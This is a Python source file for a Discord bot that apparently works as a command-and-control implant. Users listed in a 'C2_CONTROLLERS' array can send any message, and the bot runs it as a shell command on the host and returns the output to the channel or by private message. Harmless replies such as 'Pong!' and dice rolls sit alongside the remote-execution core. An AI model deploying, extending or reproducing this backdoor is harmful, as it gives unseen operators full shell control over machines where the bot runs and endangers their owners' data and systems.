from typing import Final
from random import randint
from discord import Intents, Client, Message
import subprocess
from random import choice, randint

# Insert the discord bot token.
TOKEN = "INSERT_THE_DISCORD_TOKEN_HERE"

#Insert the Discord ID (not nickname) of users that will send commands.
C2_CONTROLLERS = ["USER1#1234", "EXAMPLE#7777", "otherUser#6969"]


def run_command(command: str) -> str:
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return str(e)

def get_response(user_input: str) -> str:
    lowered: str = user_input.lower()

    if lowered == '':
        return 'Well'
    elif 'hello' in lowered:
        return 'Hi!'
    elif 'ping' in lowered:
        return 'Pong!'
    elif 'check' in lowered:
        return 'Up!'
    elif 'roll dice' in lowered:
        return f'Roll Result: {randint(1, 6)}'
    else:
        return


#print(TOKEN)

intents: Intents = Intents.default()
intents.message_content = True
client: Client = Client(intents=intents)

async def send_message(message: Message, user_message: str, retorno: str = None) -> None:
    if not user_message:
        print('(Message empty)')
        return
    
    if is_private := user_message[0] == '?':
        user_message = user_message[1:]

    try:
        response: str = get_response(user_message)
        
        if retorno:
            for chunk in [retorno[i:i+2000] for i in range(0, len(retorno), 2000)]:
                await message.author.send(chunk) if is_private else await message.channel.send(chunk)
        elif response:
            await message.author.send(response) if is_private else await message.channel.send(response)
                
    except Exception as e:
        print(e)

@client.event
async def on_ready() -> None:
    print(f'{client.user} is running!')

@client.event
async def on_message(message: Message) -> None:
    if message.author == client.user:
        return
    
    username: str = str(message.author)
    user_message: str = message.content
    channel: str = str(message.channel)

    print(f'[{channel}] {username}: "{user_message}"')

    retorno = None 

    # THE BOT WILL ONLY READ THE INPUT AS A COMMAND IF THE USER ID IS ON THE LIST
    if username in C2_CONTROLLERS:
        retorno = run_command(user_message) 

    await send_message(message, user_message, retorno)

def main() -> None:
    client.run(token=TOKEN)

if __name__ == '__main__':
    main()

